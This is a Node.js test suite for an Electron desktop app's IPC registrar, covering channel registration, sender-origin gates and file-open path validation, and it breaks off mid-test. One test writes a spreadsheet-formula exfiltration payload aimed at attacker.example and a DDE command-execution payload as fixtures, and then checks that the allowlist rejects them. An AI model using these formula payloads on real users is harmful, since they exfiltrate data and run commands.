"use strict";

const { test } = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
const Module = require("node:module");

const ROOT = path.join(__dirname, "..");
const MODULE_PATH = path.join(ROOT, "ipc-registrar.js");
const SOURCE = fs.readFileSync(MODULE_PATH, "utf8");
const MAIN_SOURCE = fs.readFileSync(path.join(ROOT, "main.js"), "utf8");
const GATEWAY_SOURCE = fs.readFileSync(
  path.join(ROOT, "gateway-supervisor.js"),
  "utf8",
);

const SHELL_HANDLES = [
  "app-menu:items",
  "browser:annotate",
  "browser:close",
  "browser:control",
  "browser:get-control",
  "browser:get-state",
  "browser:navigate",
  "browser:open",
  "browser:set-agent-act",
  "browser:set-bounds",
  "browser:set-control-owner",
  "browser:set-inactive",
  "browser:set-overlay",
  "browser:track-session",
  "crash-reports:get",
  "crash-reports:reveal",
  "dashboard:open-file",
  "global-hotkey:get",
  "local-gateway:get",
  "local-gateway:set",
  "pane:clear-http-cache",
  "wsl:detect",
  "zoom:get",
  "zoom:set",
  "zoom:step",
].sort();

const SHELL_LISTENERS = [
  "app-menu:execute",
  "badge:set",
  "dev-mode-changed",
  "focus-mode-chrome",
  "memory-sample",
  "mic:denied",
  "theme-accent-changed",
  "theme-mode-changed",
  "titlebar-overlay-theme",
  "window-control",
].sort();

const UPDATE_HANDLES = [
  "update:check",
  "update:download",
  "update:get-info",
  "update:install",
  "update:set-auto-download",
  "update:set-channel",
].sort();

function fakeStore(initial = {}) {
  const data = { ...initial };
  const writes = [];
  return {
    data,
    writes,
    path: "/virtual/config.json",
    get(key, fallback) {
      return Object.prototype.hasOwnProperty.call(data, key) ? data[key] : fallback;
    },
    set(key, value) {
      data[key] = value;
      writes.push([key, value]);
    },
  };
}

function makeHotkeyStub() {
  const state = {
    current: "",
    logger: null,
    summonDeps: null,
    summonCalls: 0,
    binds: [],
    unregisters: 0,
  };
  const DEFAULT_GLOBAL_HOTKEY = "Test+Shift+K";
  return {
    state,
    module: {
      DEFAULT_GLOBAL_HOTKEY,
      createSummonHandler(deps) {
        state.summonDeps = deps;
        return () => { state.summonCalls += 1; };
      },
      bindGlobalHotkey(saved, handler) {
        state.binds.push({ saved, handler });
        state.current = typeof saved === "string" ? saved : DEFAULT_GLOBAL_HOTKEY;
        return { accelerator: state.current, bound: !!state.current };
      },
      unregisterGlobalHotkey() {
        state.unregisters += 1;
        state.current = "";
      },
      currentGlobalHotkey() {
        return state.current;
      },
      setGlobalHotkeyLogger(logger) {
        state.logger = logger;
      },
    },
  };
}

/** Load a fresh registrar with every runtime-bearing dependency replaced. */
function loadRegistrar(initAutoUpdate) {
  const hotkey = makeHotkeyStub();
  const updaterPackage = { autoUpdater: { fake: "electron-updater" } };
  const originalLoad = Module._load;
  Module._load = function loadWithFakes(request, parent, isMain) {
    if (request === "electron") {
      throw new Error("ipc-registrar tests must never load real Electron");
    }
    if (request === "./global-hotkey" && parent?.filename === MODULE_PATH) {
      return hotkey.module;
    }
    if (request === "./auto-update" && parent?.filename === MODULE_PATH) {
      return { initAutoUpdate };
    }
    return originalLoad.call(this, request, parent, isMain);
  };

  delete require.cache[require.resolve(MODULE_PATH)];
  let createIpcRegistrar;
  try {
    ({ createIpcRegistrar } = require(MODULE_PATH));
  } finally {
    Module._load = originalLoad;
  }

  // electron-updater is intentionally required lazily inside registerUpdater.
  // Keep this seam scoped to that synchronous call so no other test sees it.
  function registerUpdater(registrar) {
    const previousLoad = Module._load;
    Module._load = function loadUpdaterFake(request, parent, isMain) {
      if (request === "electron-updater" && parent?.filename === MODULE_PATH) {
        return updaterPackage;
      }
      if (request === "electron") {
        throw new Error("ipc-registrar tests must never load real Electron");
      }
      return previousLoad.call(this, request, parent, isMain);
    };
    try {
      return registrar.registerUpdater();
    } finally {
      Module._load = previousLoad;
    }
  }

  return { createIpcRegistrar, hotkey, updaterPackage, registerUpdater };
}

function harness({
  initAutoUpdate = () => updaterHandle(),
  storeValues = {},
  backendUrl = "http://localhost:5476",
  port = 5476,
  wslOwner = { fake: "wsl-owner" },
  wslGatewayLocal = true,
  primaryPortOwner = "kirocrew",
  crashScan,
  revealThrows = false,
  openPathResult = "",
  openPathThrows = false,
  // Called synchronously INSIDE the openPath mock, so a test can observe
  // process state that only holds for the duration of the native launch (the
  // narrowed launcher PATH openPathHardened installs and then restores).
  onOpenPath = null,
  detectWsl = async () => ({
    available: true,
    distros: [],
    defaultDistro: null,
  }),
} = {}) {
  const order = [];
  const shellCalls = [];
  const crashScans = [];
  const windowCalls = [];
  const gatewayCalls = [];
  const appCalls = [];
  const notifications = [];
  const sentUpdates = [];
  const wslDetections = [];
  const handlers = new Map();
  const listeners = new Map();
  const store = fakeStore(storeValues);

  const ipcMain = {
    handle(channel, handler) {
      assert.equal(handlers.has(channel), false, `duplicate handle(${channel})`);
      handlers.set(channel, handler);
      order.push(`handle:${channel}`);
    },
    on(channel, listener) {
      assert.equal(listeners.has(channel), false, `duplicate on(${channel})`);
      listeners.set(channel, listener);
      order.push(`on:${channel}`);
    },
  };

  class FakeNotification {
    constructor(options) {
      this.options = options;
      this.events = new Map();
      this.shown = 0;
      notifications.push(this);
    }
    on(name, listener) { this.events.set(name, listener); }
    show() { this.shown += 1; }
  }

  const liveContents = {
    isDestroyed: () => false,
    send: (...args) => sentUpdates.push(args),
  };
  const destroyedContents = {
    isDestroyed: () => true,
    send: () => { throw new Error("destroyed WebContents must not receive state"); },
  };
  const electron = {
    app: {
      name: "Kiro Crew Test",
      isPackaged: true,
      getVersion: () => "9.8.7",
      focus: (...args) => appCalls.push(["focus", ...args]),
      setBadgeCount: (...args) => appCalls.push(["setBadgeCount", ...args]),
    },
    dialog: { fake: "dialog" },
    Notification: FakeNotification,
    ipcMain,
    shell: {
      showItemInFolder: (...args) => {
        shellCalls.push(["showItemInFolder", ...args]);
        if (revealThrows) throw new Error("Finder is unavailable");
      },
      openPath: async (...args) => {
        shellCalls.push(["openPath", ...args]);
        if (onOpenPath) onOpenPath();
        if (openPathThrows) throw new Error("shell.openPath blew up");
        return openPathResult;
      },
    },
    webContents: { getAllWebContents: () => [liveContents, destroyedContents] },
  };

  const recordWindow = (name, result = { from: name }) => (...args) => {
    windowCalls.push([name, ...args]);
    return result;
  };
  const windows = {
    getSummonWindow: recordWindow("getSummonWindow", null),
    focusedDashboardWindow: recordWindow("focusedDashboardWindow", null),
    getMainWindow: recordWindow("getMainWindow", null),
    createMainWindow: recordWindow("createMainWindow", { fake: "window" }),
    showMainWindow: recordWindow("showMainWindow", true),
    windowForWebContents: recordWindow("windowForWebContents", wslOwner),
    menu: {
      buildApplicationMenu: (...args) => {
        order.push("menu.buildApplicationMenu");
        return recordWindow("menu.buildApplicationMenu", { fake: "menu" })(...args);
      },
      items: recordWindow("menu.items"),
      execute: recordWindow("menu.execute"),
      setDevMode: recordWindow("menu.setDevMode"),
    },
    chrome: {
      setThemeAccent: recordWindow("chrome.setThemeAccent"),
      focusMode: recordWindow("chrome.focusMode"),
      windowControl: recordWindow("chrome.windowControl"),
      setThemeMode: recordWindow("chrome.setThemeMode"),
      setTitlebarMode: recordWindow("chrome.setTitlebarMode"),
      getZoom: recordWindow("chrome.getZoom", 1.25),
      setZoom: recordWindow("chrome.setZoom", 1.5),
      stepZoom: recordWindow("chrome.stepZoom", 1.75),
    },
    browser: {},
    security: {
      configureSession: (...args) => {
        order.push("security.configureSession");
        return recordWindow("security.configureSession")(...args);
      },
      micDenied: recordWindow("security.micDenied"),
      isGatewayLocalForWindow: recordWindow(
        "security.isGatewayLocalForWindow",
        wslGatewayLocal,
      ),
    },
    diagnostics: {
      memorySample: recordWindow("diagnostics.memorySample"),
    },
  };
  for (const name of [
    "open",
    "navigate",
    "setBounds",
    "setOverlay",
    "setInactive",
    "close",
    "getState",
    "trackSession",
    "setAgentAct",
    "setControlOwner",
    "getControl",
    "control",
    "annotate",
  ]) {
    windows.browser[name] = recordWindow(`browser.${name}`, { from: `browser.${name}` });
  }

  const recordGateway = (name, result) => (...args) => {
    gatewayCalls.push([name, ...args]);
    return result;
  };
  const gateway = {
    stopGracefully: recordGateway("stopGracefully", Promise.resolve("stopped")),
    onInstallDispatched: recordGateway("onInstallDispatched"),
    onInstallFailed: recordGateway("onInstallFailed"),
    probePrimaryPortOwner: recordGateway(
      "probePrimaryPortOwner",
      Promise.resolve(primaryPortOwner),
    ),
  };
  const logs = [];
  const runWslDetection = (...args) => {
    wslDetections.push(args);
    return detectWsl(...args);
  };
  const loaded = loadRegistrar(initAutoUpdate);
  const registrar = loaded.createIpcRegistrar({
    electron,
    store,
    windows,
    gateway,
    backendUrl,
    port,
    detectWsl: runWslDetection,
    crashScan: crashScan === undefined ? undefined : () => {
      crashScans.push(true);
      return typeof crashScan === "function" ? crashScan() : crashScan;
    },
    glog: (line) => logs.push(line),
  });

  return {
    ...loaded,
    registrar,
    electron,
    windows,
    gateway,
    store,
    handlers,
    listeners,
    order,
    windowCalls,
    gatewayCalls,
    appCalls,
    notifications,
    sentUpdates,
    wslDetections,
    shellCalls,
    crashScans,
    logs,
  };
}

function updaterHandle(overrides = {}) {
  const calls = [];
  return {
    calls,
    disabled: undefined,
    getInfo: () => ({ version: "2.0.0", packaged: true }),
    check: () => calls.push("check"),
    download: () => calls.push("download"),
    install: async () => { calls.push("install"); },
    ...overrides,
  };
}

function lastCall(calls, name) {
  const found = [...calls].reverse().find((entry) => entry[0] === name);
  assert.ok(found, `expected ${name} call`);
  return found;
}

const WSL_RESTRICTED_ERROR = "wsl:detect is restricted to the local dashboard";

function wslEvent(url = "http://localhost:5476/system/services") {
  return {
    sender: { id: "wsl-dashboard-sender" },
    senderFrame: { url },
  };
}

async function assertWslRejected(invoke) {
  await assert.rejects(invoke, (error) => {
    assert.equal(error && error.message, WSL_RESTRICTED_ERROR);
    return true;
  });
}

test("module boundary never imports Electron directly", () => {
  assert.doesNotMatch(
    SOURCE,
    /require\(\s*["']electron["']\s*\)/,
    "Electron objects must come from createIpcRegistrar's factory argument",
  );
});

test("factory requires an integer primary port", () => {
  const { createIpcRegistrar } = loadRegistrar(() => updaterHandle());
  const dependencies = {
    electron: {},
    store: {},
    windows: {},
    gateway: {},
    backendUrl: "http://localhost:5476",
  };

  assert.throws(
    () => createIpcRegistrar(dependencies),
    { message: "createIpcRegistrar: port is required" },
  );
  assert.throws(
    () => createIpcRegistrar({ ...dependencies, port: "5476" }),
    { message: "createIpcRegistrar: port is required" },
  );
});

test("registerShell owns the exact shell channel set and is idempotent", () => {
  const h = harness();
  assert.strictEqual(h.registrar.registerShell(), h.registrar.summonDashboard);
  assert.doesNotThrow(() => h.registrar.registerShell());

  assert.deepEqual([...h.handlers.keys()].sort(), SHELL_HANDLES);
  assert.deepEqual([...h.listeners.keys()].sort(), SHELL_LISTENERS);
  assert.equal(h.handlers.size + h.listeners.size, 35);

  // boot-complete is a further non-update host channel, but it is deliberately
  // gateway-owned and scoped to a single connecting WebContents. Registering it
  // globally here would weaken its sender check and leak listeners.
  assert.match(GATEWAY_SOURCE, /ipcMain\.on\("boot-complete", onComplete\)/);
  assert.equal(h.handlers.size + h.listeners.size + 1, 36);
  assert.equal(h.handlers.has("boot-complete"), false);
  assert.equal(h.listeners.has("boot-complete"), false);

  assert.equal(
    h.windowCalls.filter(([name]) => name === "security.configureSession").length,
    1,
  );
  assert.equal(
    h.windowCalls.filter(([name]) => name === "menu.buildApplicationMenu").length,
    1,
  );
  assert.equal(
    h.windowCalls.filter(([name]) => name === "createMainWindow").length,
    0,
    "registerShell must not create a window itself",
  );
  assert.deepEqual(h.order.slice(0, 2), [
    "security.configureSession",
    "menu.buildApplicationMenu",
  ]);
  const localGatewaySet = h.order.indexOf("handle:local-gateway:set");
  const wslDetect = h.order.indexOf("handle:wsl:detect");
  const zoomGet = h.order.indexOf("handle:zoom:get");
  assert.ok(
    localGatewaySet !== -1
      && localGatewaySet < wslDetect
      && wslDetect < zoomGet,
    "wsl:detect must remain between local-gateway:set and zoom:get",
  );
});

test("main composes session security before the first dashboard window", () => {
  const ready = MAIN_SOURCE.indexOf("app.whenReady().then(async () => {");
  const shell = MAIN_SOURCE.indexOf("ipcRegistrar.registerShell();", ready);
  const window = MAIN_SOURCE.indexOf("windows.createMainWindow();", ready);
  assert.ok(ready !== -1 && shell > ready && window > shell,
    "ready composition must register session security/IPC before createMainWindow");
});

test("shell handlers preserve sender, argument, and return shapes", async () => {
  const h = harness({ storeValues: { runLocalGateway: true } });
  h.registrar.registerShell();
  const sender = { id: "dashboard-sender" };
  const event = { sender };

  assert.deepEqual(h.handlers.get("app-menu:items")(event, "file-menu"), {
    from: "menu.items",
  });
  assert.deepEqual(lastCall(h.windowCalls, "menu.items").slice(1), [sender, "file-menu"]);
  h.listeners.get("app-menu:execute")(event, "view-menu", 3);
  assert.deepEqual(lastCall(h.windowCalls, "menu.execute").slice(1), [sender, "view-menu", 3]);
  h.listeners.get("dev-mode-changed")(event, true);
  assert.deepEqual(lastCall(h.windowCalls, "menu.setDevMode").slice(1), [true]);

  const chromeCases = [
    ["theme-accent-changed", "chrome.setThemeAccent", ["#8E48FF"]],
    ["focus-mode-chrome", "chrome.focusMode", [sender, false]],
    ["window-control", "chrome.windowControl", [sender, "maximize"]],
    ["theme-mode-changed", "chrome.setThemeMode", ["dark"]],
    ["titlebar-overlay-theme", "chrome.setTitlebarMode", ["light"]],
  ];
  for (const [channel, owner, args] of chromeCases) {
    h.listeners.get(channel)(event, ...args.filter((value) => value !== sender));
    assert.deepEqual(lastCall(h.windowCalls, owner).slice(1), args, channel);
  }

  assert.equal(h.handlers.get("zoom:get")(event), 1.25);
  assert.equal(h.handlers.get("zoom:set")(event, 1.51), 1.5);
  assert.equal(h.handlers.get("zoom:step")(event, -1), 1.75);
  assert.deepEqual(lastCall(h.windowCalls, "chrome.setZoom").slice(1), [sender, 1.51]);
  assert.deepEqual(lastCall(h.windowCalls, "chrome.stepZoom").slice(1), [sender, -1]);

  const browserCases = [
    ["browser:open", "open", ["panel", "https://example.test"]],
    ["browser:navigate", "navigate", ["panel", "https://next.test"]],
    ["browser:set-bounds", "setBounds", ["panel", { x: 1 }, { width: 9 }]],
    ["browser:set-overlay", "setOverlay", ["panel", true]],
    ["browser:set-inactive", "setInactive", ["panel", false]],
    ["browser:close", "close", ["panel"]],
    ["browser:get-state", "getState", ["panel"]],
    ["browser:track-session", "trackSession", ["panel", true]],
    ["browser:set-agent-act", "setAgentAct", ["panel", false]],
    ["browser:set-control-owner", "setControlOwner", ["panel", "agent"]],
    ["browser:get-control", "getControl", ["panel"]],
    ["browser:control", "control", ["panel", "click", { x: 4 }]],
    ["browser:annotate", "annotate", ["panel", "poll", {}]],
  ];
  for (const [channel, owner, args] of browserCases) {
    const result = await h.handlers.get(channel)(event, ...args);
    assert.deepEqual(result, { from: `browser.${owner}` }, channel);
    assert.deepEqual(lastCall(h.windowCalls, `browser.${owner}`).slice(1), [sender, ...args]);
  }

  h.listeners.get("mic:denied")(event);
  assert.deepEqual(lastCall(h.windowCalls, "security.micDenied").slice(1), []);
  const sample = { realm: "dashboard", externalKB: 4096 };
  h.listeners.get("memory-sample")(event, sample);
  assert.deepEqual(lastCall(h.windowCalls, "diagnostics.memorySample").slice(1), [sender, sample]);

  h.listeners.get("badge:set")(event, 7.9);
  assert.deepEqual(lastCall(h.appCalls, "setBadgeCount").slice(1), [7]);
  assert.equal(h.handlers.get("local-gateway:get")(event), true);
  assert.equal(h.handlers.get("local-gateway:set")(event, false), false);
  assert.equal(h.store.data.runLocalGateway, false);
  assert.deepEqual(h.handlers.get("global-hotkey:get")(event), {
    accelerator: "",
    default: "Test+Shift+K",
  });
});

// A completed scan, shaped like collectCrashReports' return value. Only
// newCrashes (what crashNoticeSummary counts) and crashLogPath (what reveal
// opens) matter here; `recorded` is carried because the log line count is
// logged, never handed to the renderer.
function crashScanResult(overrides = {}) {
  return {
    crashLogPath: "/logs/crashes.log",
    newCrashes: [{ key: "a" }, { key: "b" }],
    recorded: 2,
    ...overrides,
  };
}

const CRASH_CHANNELS = ["crash-reports:get", "crash-reports:reveal"];

test("crash-reports channels reject wrong and unreadable sender origins", async () => {
  for (const channel of CRASH_CHANNELS) {
    for (const [label, event, loggedOrigin] of [
      ["wrong", wslEvent("https://remote.example/settings"), "https://remote.example"],
      ["unreadable", { sender: { id: "blank" } }, "(unreadable)"],
    ]) {
      const h = harness({ crashScan: crashScanResult });
      h.registrar.registerShell();

      await assert.rejects(
        () => h.handlers.get(channel)(event),
        (error) => {
          assert.equal(
            error && error.message,
            `${channel} is restricted to the local dashboard`,
          );
          return true;
        },
        `${channel}/${label}: a foreign origin must be refused`,
      );
      assert.equal(
        h.gatewayCalls.some(([name]) => name === "probePrimaryPortOwner"),
        false,
        `${channel}/${label}: an origin rejection must precede the port probe`,
      );

      // Refusing BEFORE the scan is the point: whether this machine crashed
      // must not be computed for a sender that may not be told the answer.
      assert.equal(h.crashScans.length, 0, `${channel}/${label}: scan must stay uncalled`);
      assert.equal(
        h.windowCalls.some(([name]) => name === "windowForWebContents"),
        false,
        `${channel}/${label}: an origin rejection must precede window lookup`,
      );
      assert.equal(h.shellCalls.length, 0, `${channel}/${label}: nothing may be revealed`);
      assert.match(
        h.logs.join("\n"),
        new RegExp(`${channel} rejected for sender origin ${loggedOrigin.replace(/[.?*+^$[\]\\(){}|-]/g, "\\$&")}`),
      );
    }
  }
});

test("crash-reports channels reject missing and remote sender-window owners", async () => {
  for (const channel of CRASH_CHANNELS) {
    for (const [label, wslOwner] of [
      ["missing", null],
      ["remote", { fake: "remote-window" }],
    ]) {
      const h = harness({ wslOwner, wslGatewayLocal: false, crashScan: crashScanResult });
      h.registrar.registerShell();
      const event = wslEvent();

      await assert.rejects(
        () => h.handlers.get(channel)(event),
        (error) => {
          assert.equal(
            error && error.message,
            `${channel} is restricted to the local dashboard`,
          );
          return true;
        },
        `${channel}/${label}: a window without a local gateway must be refused`,
      );
      assert.equal(
        h.gatewayCalls.some(([name]) => name === "probePrimaryPortOwner"),
        false,
        `${channel}/${label}: a gateway rejection must precede the port probe`,
      );

      assert.deepEqual(
        lastCall(h.windowCalls, "windowForWebContents").slice(1),
        [event.sender],
        `${channel}/${label}: ownership must resolve from event.sender`,
      );
      assert.deepEqual(
        lastCall(h.windowCalls, "security.isGatewayLocalForWindow").slice(1),
        [wslOwner],
        `${channel}/${label}: the resolved owner must reach the shared predicate`,
      );
      assert.equal(h.crashScans.length, 0, `${channel}/${label}: scan must stay uncalled`);
      assert.equal(h.shellCalls.length, 0, `${channel}/${label}: nothing may be revealed`);
      assert.match(h.logs.join("\n"), /sender window without a local gateway/);
    }
  }
});

// Gate 3, the one a manual SSH tunnel is the whole reason for. Gates 1 and 2 can
// both pass for a tunnel: the sender IS backendUrl, and `isGatewayLocalForWindow`
// can only consult the remote-host CONFIG, which a hand-rolled `ssh -L` never
// enters. Only positively identifying the listener separates the two, and
// `crash-reports:reveal` is not a read — it opens a file-manager window on the
// machine in front of the user.
test("crash-reports channels reject a primary port held by anything else", async () => {
  for (const channel of CRASH_CHANNELS) {
    for (const owner of ["foreign", "unbound", "unknown", null]) {
      const h = harness({ primaryPortOwner: owner, crashScan: crashScanResult });
      h.registrar.registerShell();

      await assert.rejects(
        () => h.handlers.get(channel)(wslEvent()),
        (error) => {
          assert.equal(
            error && error.message,
            `${channel} is restricted to the local dashboard`,
          );
          return true;
        },
        `${channel}/${owner}: a port this shell does not own must be refused`,
      );

      assert.equal(h.crashScans.length, 0, `${channel}/${owner}: scan must stay uncalled`);
      assert.equal(h.shellCalls.length, 0, `${channel}/${owner}: nothing may be revealed`);
      assert.match(h.logs.join("\n"), new RegExp(`${channel} rejected: :\\d+ held by ${owner}`));
    }
  }
});

test("crash-reports channels accept the service manager as the port owner", async () => {
  for (const channel of CRASH_CHANNELS) {
    const h = harness({ primaryPortOwner: "service", crashScan: crashScanResult });
    h.registrar.registerShell();
    await h.handlers.get(channel)(wslEvent());
    assert.equal(h.crashScans.length, 1, `${channel}: a service-held port is this shell's own`);
  }
});

test("crash-reports:get narrows the scan to a single count", async () => {
  const h = harness({ crashScan: crashScanResult });
  h.registrar.registerShell();

  const summary = await h.handlers.get("crash-reports:get")(wslEvent());

  assert.deepEqual(summary, { newCount: 2 });
  // The renderer must never receive a path, a filename, an exception code, or
  // even a timestamp: the reveal gesture happens in the trusted process
  // precisely so it need not.
  assert.deepEqual(Object.keys(summary).sort(), ["newCount"]);
  assert.equal(h.crashScans.length, 1, "the summary must come from the injected scan");
});

test("crash-reports:get reports nothing when no collector was injected", async () => {
  const h = harness();
  h.registrar.registerShell();

  assert.deepEqual(await h.handlers.get("crash-reports:get")(wslEvent()), { newCount: 0 });
});

test("crash-reports:reveal selects the ledger the main process resolved itself", async () => {
  const h = harness({ crashScan: crashScanResult });
  h.registrar.registerShell();

  assert.deepEqual(await h.handlers.get("crash-reports:reveal")(wslEvent()), { ok: true });
  assert.deepEqual(lastCall(h.shellCalls, "showItemInFolder").slice(1), ["/logs/crashes.log"]);
});

test("crash-reports:reveal reports rather than throws when there is nothing to show", async () => {
  for (const [label, crashScan] of [
    ["no collector", undefined],
    ["scan failed", () => null],
    ["no log written", () => crashScanResult({ crashLogPath: "" })],
  ]) {
    const h = harness({ crashScan });
    h.registrar.registerShell();

    assert.deepEqual(
      await h.handlers.get("crash-reports:reveal")(wslEvent()),
      { ok: false, error: "no crash log" },
      `${label}: a missing ledger is a result, not a renderer exception`,
    );
    assert.equal(h.shellCalls.length, 0, `${label}: nothing may be revealed`);
  }
});

test("crash-reports:reveal survives a shell that refuses to open the folder", async () => {
  const h = harness({ crashScan: crashScanResult, revealThrows: true });
  h.registrar.registerShell();

  assert.deepEqual(await h.handlers.get("crash-reports:reveal")(wslEvent()), {
    ok: false,
    error: "Finder is unavailable",
  });
  assert.match(h.logs.join("\n"), /crash-reports:reveal failed: Finder is unavailable/);
});

test("wsl:detect rejects wrong and unreadable sender origins before owner lookup", async () => {
  for (const [label, event, loggedOrigin] of [
    ["wrong", wslEvent("https://remote.example/system/services"), "https://remote.example"],
    ["unreadable", { sender: { id: "blank" } }, "(unreadable)"],
  ]) {
    const h = harness();
    h.registrar.registerShell();

    await assertWslRejected(() => h.handlers.get("wsl:detect")(event));

    assert.equal(h.wslDetections.length, 0, `${label}: detection must stay uncalled`);
    assert.equal(
      h.windowCalls.some(([name]) => name === "windowForWebContents"),
      false,
      `${label}: an origin rejection must happen before window lookup`,
    );
    assert.equal(h.gatewayCalls.length, 0, `${label}: port ownership must stay unprobed`);
    assert.match(h.logs.join("\n"), new RegExp(`sender origin .*${loggedOrigin.replace(/[.?*+^$[\]\\(){}|-]/g, "\\$&")}`));
  }
});

test("wsl:detect rejects missing and remote sender-window owners", async () => {
  for (const [label, wslOwner] of [
    ["missing", null],
    ["remote", { fake: "remote-window" }],
  ]) {
    const h = harness({ wslOwner, wslGatewayLocal: false });
    h.registrar.registerShell();
    const event = wslEvent();

    await assertWslRejected(() => h.handlers.get("wsl:detect")(event));

    assert.deepEqual(
      lastCall(h.windowCalls, "windowForWebContents").slice(1),
      [event.sender],
      `${label}: ownership must resolve from event.sender`,
    );
    assert.deepEqual(
      lastCall(h.windowCalls, "security.isGatewayLocalForWindow").slice(1),
      [wslOwner],
      `${label}: the resolved owner must reach the shared local-gateway predicate`,
    );
    assert.equal(h.gatewayCalls.length, 0, `${label}: rejected owners must not probe the port`);
    assert.equal(h.wslDetections.length, 0, `${label}: detection must stay uncalled`);
    assert.match(h.logs.join("\n"), /sender window without a local gateway/);
  }
});

test("wsl:detect rejects every non-owned primary-port classification", async () => {
  for (const portOwner of ["foreign", "none", "unknown"]) {
    const h = harness({ port: 6123, primaryPortOwner: portOwner });
    h.registrar.registerShell();

    await assertWslRejected(() => h.handlers.get("wsl:detect")(wslEvent()));

    assert.deepEqual(h.gatewayCalls.map(([name]) => name), ["probePrimaryPortOwner"]);
    assert.equal(h.wslDetections.length, 0, `${portOwner}: detection must stay uncalled`);
    assert.equal(
      h.logs[h.logs.length - 1],
      `wsl:detect rejected: :6123 held by ${portOwner}, not this shell's gateway`,
    );
  }
});

test("wsl:detect allows owned and service-managed primary gateways without reshaping", async () => {
  for (const portOwner of ["kirocrew", "service"]) {
    const result = {
      available: true,
      distros: [{
        name: "Ubuntu",
        state: "running",
        stateLabel: "Running",
        version: 2,
        isDefault: true,
      }],
      defaultDistro: "Ubuntu",
    };
    const h = harness({ primaryPortOwner: portOwner, detectWsl: async () => result });
    h.registrar.registerShell();

    assert.strictEqual(await h.handlers.get("wsl:detect")(wslEvent()), result);
    assert.deepEqual(h.gatewayCalls.map(([name]) => name), ["probePrimaryPortOwner"]);
    assert.deepEqual(h.wslDetections, [[]]);
  }
});

test("dashboard:open-file routes through the shared local-dashboard gate", async () => {
  // Gate 1 rejection (wrong origin) must fire before any fs or shell work: this
  // is a LAUNCH on the local machine, the same hazard crash-reports:reveal
  // guards, so a remote renderer must never reach shell.openPath.
  const h = harness();
  h.registrar.registerShell();
  await assert.rejects(
    () => h.handlers.get("dashboard:open-file")(
      wslEvent("https://remote.example/chat"),
      "/tmp/whatever.md",
    ),
    (error) => {
      assert.equal(error && error.message, "dashboard:open-file is restricted to the local dashboard");
      return true;
    },
  );
  assert.equal(h.shellCalls.length, 0, "a rejected sender must not reach shell.openPath");
  assert.equal(
    h.gatewayCalls.some(([name]) => name === "probePrimaryPortOwner"),
    false,
    "an origin rejection must precede the port probe",
  );
});

test("dashboard:open-file validates the path before handing it to the OS", async () => {
  const scratch = fs.mkdtempSync(path.join(os.tmpdir(), "openfile-"));
  try {
    const mdFile = path.join(scratch, "note.md");
    fs.writeFileSync(mdFile, "# hi\n");
    const exeFile = path.join(scratch, "run.exe");
    fs.writeFileSync(exeFile, "MZ");
    // A script whose OS default association EXECUTES it (Windows Script Host on
    // .js). Plain text a user might edit, but launching it runs it, so the
    // allowlist must reject it — this pins the security fix.
    const jsFile = path.join(scratch, "hack.js");
    fs.writeFileSync(jsFile, "process.exit(1)");
    // Browser ACTIVE DOCUMENTS: opened at a file:// origin the browser can
    // execute embedded script, so the allowlist rejects them BY EXTENSION. The
    // handler never reads the bytes (it checks realpath + extension + isFile),
    // so the fixture content is deliberately inert — the rejection is about the
    // `.html`/`.svg` extension, not anything in the file.
    const htmlFile = path.join(scratch, "page.html");
    fs.writeFileSync(htmlFile, "<html><body>hello</body></html>");
    const svgFile = path.join(scratch, "art.svg");
    fs.writeFileSync(svgFile, "<svg xmlns=\"http://www.w3.org/2000/svg\"></svg>");
    // Rich documents whose default app can execute embedded content (legacy .doc
    // VBA/AutoOpen; PDF reader JavaScript) — excluded by the passive-only rule.
    const docFile = path.join(scratch, "memo.doc");
    fs.writeFileSync(docFile, "\xd0\xcf\x11\xe0macro");
    const pdfFile = path.join(scratch, "report.pdf");
    fs.writeFileSync(pdfFile, "%PDF-1.4");
    // Spreadsheets: the default handler (Excel / Numbers / LibreOffice Calc)
    // EVALUATES a leading `=` cell, so an agent-authored `=WEBSERVICE(...)`
    // exfiltrates and `=cmd|...` reaches DDE. The fixture carries a real
    // formula to name the threat, but the rejection is BY EXTENSION -- the
    // handler never reads the bytes.
    const csvFile = path.join(scratch, "data.csv");
    fs.writeFileSync(csvFile, "=WEBSERVICE(\"http://attacker.example/\"&A1)\n");
    const tsvFile = path.join(scratch, "data.tsv");
    fs.writeFileSync(tsvFile, "=cmd|'/c calc'!A0\n");
    const subdir = path.join(scratch, "adir.md"); // a DIRECTORY with an openable ext
    fs.mkdirSync(subdir);
    // A `.md` symlink whose target is an unsupported type: realpath BEFORE the
    // extension test must judge it by the resolved `.exe`, not the link name.
    const mdSymlinkToExe = path.join(scratch, "decoy.md");
    fs.symlinkSync(exeFile, mdSymlinkToExe);

    const cases = [
      ["", { ok: false, error: "no path" }, false],
      [123, { ok: false, error: "no path" }, false],
      [exeFile, { ok: false, error: "unsupported file type" }, false],
      [jsFile, { ok: false, error: "unsupported file type" }, false],
      [htmlFile, { ok: false, error: "unsupported file type" }, false],
      [svgFile, { ok: false, error: "unsupported file type" }, false],
      [docFile, { ok: false, error: "unsupported file type" }, false],
      [pdfFile, { ok: false, error: "unsupported file type" }, false],
      [csvFile, { ok: false, error: "unsupported file type" }, false],
      [tsvFile, { ok: false, error: "unsupported file type" }, false],
      [subdir, { ok: false, error: "not a file" }, false],
      [mdSymlinkToExe, { ok: false, error: "unsupported file type" }, false],
    ];
    for (const [input, expected, reachesShell] of cases) {
      const h = harness();
      h.registrar.registerShell();
      const result = await h.handlers.get("dashboard:open-file")(wslEvent(), input);
      assert.deepEqual(result, expected, `input ${JSON.stringify(input)}`);
      assert.equal(
        h.shellCalls.some(([name]) => name === "openPath"),
        reachesShell,
        `input ${JSON.stringify(input)}: shell.openPath reachability`,
      );
    }
  } finally {
    fs.rmSync(scratch, { recursive: true, force: true });
  }
});

test("dashboard:open-file opens a valid file at its realpath and reports OS refusals", async () => {
  const scratch = fs.mkdtempSync(path.join(os.tmpdir(), "openfile-"));
  try {
    const real = path.join(scratch, "doc.md");
    fs.writeFileSync(real, "# doc\n");
    const realResolved = fs.realpathSync(real);
    // A `.md` symlink to a real `.md` file: the OS must receive the RESOLVED
    // path, not the link, so a later check cannot be dodged by the link name.
    const link = path.join(scratch, "alias.md");
    fs.symlinkSync(real, link);

    // Happy path: openPath returns "" (opened), handler reports ok and passes
    // the realpath.
    const ok = harness();
    ok.registrar.registerShell();
    assert.deepEqual(await ok.handlers.get("dashboard:open-file")(wslEvent(), link), { ok: true });
    assert.deepEqual(lastCall(ok.shellCalls, "openPath").slice(1), [realResolved]);

    // OS refusal: a non-empty openPath return is surfaced, not swallowed.
